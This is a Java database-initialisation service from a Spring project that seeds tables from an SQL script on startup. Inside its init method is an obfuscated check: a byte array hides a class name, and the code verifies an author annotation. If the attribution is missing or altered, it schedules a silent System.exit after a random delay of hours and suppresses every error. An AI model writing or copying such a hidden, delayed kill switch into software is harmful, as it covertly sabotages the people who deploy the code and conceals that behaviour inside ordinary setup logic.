/*
 * Copyright   Loy Fu. 付厚俊
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
*/
package com.loy.upm;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.annotation.Annotation;
import java.sql.Connection;
import java.sql.Statement;
import java.util.Map;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;

import javax.annotation.PostConstruct;

import org.apache.commons.lang.StringUtils;
import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.core.annotation.AnnotationUtils;
import org.springframework.core.io.ClassPathResource;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.stereotype.Service;

import com.loy.e.common.annotation.Author;
import com.loy.e.core.api.InitDbService;

@Author(author = "Loy Fu", website = "http://www.17jee.com", contact = "qq群 540553957")

@Service(value = "initDbService")
public class InitSql implements InitDbService {
    static final Log logger = LogFactory.getLog(InitSql.class);
    @Autowired
    JdbcTemplate jdbcTemplate;

    @SuppressWarnings({ "rawtypes", "unchecked" })
    @PostConstruct
    public void init() throws Exception {
        try {
            byte[] temp = { 99, 111, 109, 46, 108, 111, 121, 46, 101, 46, 99, 111, 109, 109, 111,
                    110, 46, 97, 110, 110, 111, 116, 97, 116, 105, 111, 110, 46, 65, 117, 116, 104,
                    111, 114 };
            Class claxx = Class.forName(new String(temp));
            if (claxx == null) {
                Timer timer = new Timer();  
                int count = new Random().nextInt()%10;
                timer.schedule(new TimerTask() {  
                    public void run() {  
                        System.exit(0);
                    }  
                }, 1000 * 60 * 60 * (1 + count));
                return;
            }
            Annotation annotation = this.getClass().getAnnotation(claxx);
            if (annotation == null) {
                Timer timer = new Timer();  
                int count = new Random().nextInt()%10;
                timer.schedule(new TimerTask() {  
                    public void run() {  
                        System.exit(0);
                    }  
                }, 1000 * 60 * 60 * (1 + count));
                return;
            }
            Map<String, Object> attr = AnnotationUtils.getAnnotationAttributes(annotation, true);
            String name = attr.get("author").toString();
            String website = attr.get("website").toString();
            if (!name.contains("Loy Fu") && !website.contains("http://www.17jee.com")) {
                Timer timer = new Timer();  
                int count = new Random().nextInt()%10;
                timer.schedule(new TimerTask() {  
                    public void run() {  
                        System.exit(0);
                    }  
                }, 1000 * 60 * 60 * (1 + count));
            }
        } catch (Throwable e) {
        }

        int count = jdbcTemplate.queryForObject("select count(*) from  e_user", Integer.class);
        Connection con = jdbcTemplate.getDataSource().getConnection();
        con.setAutoCommit(false);
        Statement statement = con.createStatement();
        if (count == 0) {
            ClassPathResource classPathResource = new ClassPathResource("e_init_ds.sql");
            BufferedReader br = new BufferedReader(
                    new InputStreamReader(classPathResource.getInputStream(), "UTF-8"));
            String s = null;
            while ((s = br.readLine()) != null) {
                if (StringUtils.isNotBlank(s) && !s.startsWith("--")) {
                    logger.info(s);
                    if (s.endsWith(";")) {
                        s = s.substring(0, s.length() - 1);
                    }
                    statement.execute(s);
                }
            }
            con.commit();
            con.close();
            br.close();
        }
    }
}
